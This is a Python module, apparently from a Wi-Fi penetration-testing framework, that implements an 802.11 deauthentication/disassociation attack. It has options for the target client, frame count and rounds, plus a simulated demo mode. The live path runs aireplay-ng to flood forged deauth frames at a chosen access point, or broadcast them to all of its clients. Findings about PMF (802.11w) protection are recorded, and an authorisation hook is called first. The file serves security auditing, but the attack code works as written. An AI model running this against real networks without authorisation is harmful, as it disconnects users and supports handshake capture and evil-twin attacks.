"""解除认证（Deauth / Disassoc）攻击."""

from __future__ import annotations

import asyncio
import time

from .base import AttackContext, AttackModule, AttackResult, Option
from ..models import is_mac, normalize_mac


class DeauthAttack(AttackModule):
    id = "deauth"
    name = "解除认证攻击"
    category = "availability"
    description = (
        "伪造 802.11 Deauth/Disassoc 管理帧，强制目标客户端断开与 AP 的连接。"
        "常用于验证 PMF(802.11w) 是否启用、配合握手捕获或邪恶双胞胎踢客户端。"
    )
    requires = ("aireplay-ng",)
    risk = "high"
    needs_monitor = True
    options = [
        Option("client", "目标客户端 MAC", "mac", "", "留空表示广播（影响所有客户端）"),
        Option("count", "每轮帧数", "int", 10, "每轮发送的 Deauth 帧数量"),
        Option("rounds", "轮数", "int", 1, "重复轮数，间隔 1 秒"),
        Option("timeout", "超时（秒）", "int", 30, "整体超时时间"),
    ]

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        client = params.get("client") or ""
        if client and not is_mac(client):
            raise ValueError("客户端 MAC 格式无效")
        channel = int(params.get("channel") or 0)
        rounds = max(1, min(int(params.get("rounds") or 1), 100))
        count = max(1, min(int(params.get("count") or 10), 5000))
        ctx.authorize("deauth", bssid, params.get("ssid", ""))

        ctx.emit(
            "attack",
            f"Deauth 目标 {bssid} · 客户端 {client or '广播'} · {rounds}×{count} 帧",
            bssid=bssid,
        )

        if ctx.demo:
            total = 0
            for index in range(rounds):
                await asyncio.sleep(0.35)
                total += count
                ctx.emit(
                    "info",
                    f"第 {index + 1}/{rounds} 轮：已发送 {count} 个解除认证帧（模拟）",
                    bssid=bssid,
                    frames=count,
                )
            ctx.finding(
                "管理帧未受 PMF 保护" if params.get("security") != "WPA3" else "检测到管理帧防护（WPA3/PMF）",
                "medium" if params.get("security") != "WPA3" else "info",
                bssid=bssid,
                ssid=params.get("ssid", ""),
                detail="Deauth 洪泛可验证客户端是否启用 802.11w；成功断开说明单播管理帧未被保护。",
                category="availability",
            )
            return AttackResult(
                ok=True,
                summary=f"已发送 {total} 个解除认证帧（模拟），目标客户端应已掉线",
                detail={"frames": total, "client": client or "broadcast", "demo": True},
                duration=time.time() - started,
            )

        monitor = await ctx.monitor()
        await ctx.set_channel(channel)
        total = 0
        output = []
        for index in range(rounds):
            cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
            if client:
                cmd += ["-c", normalize_mac(client)]
            cmd += ["--ignore-negative-one", monitor]
            result = await ctx.runner.run(cmd, timeout=min(60, max(10, count)))
            output.append(result.text[-1200:])
            total += count
            ctx.emit(
                "info",
                f"第 {index + 1}/{rounds} 轮完成（返回码 {result.returncode}）",
                frames=total,
            )
            if not result.ok and result.returncode != 0 and index == 0:
                ctx.emit("warning", f"aireplay-ng 返回：{result.text[-400:]}")
            await asyncio.sleep(1)
        ctx.finding(
            "管理帧可被伪造（未启用 PMF）",
            "medium",
            bssid=bssid,
            ssid=params.get("ssid", ""),
            detail="通过 aireplay-ng 发送伪造 Deauth 帧成功，建议启用 802.11w。",
            category="availability",
        )
        return AttackResult(
            ok=total > 0,
            summary=f"已发送 {total} 个解除认证帧",
            detail={"frames": total, "client": client or "broadcast", "output": output[-3:]},
            duration=time.time() - started,
        )
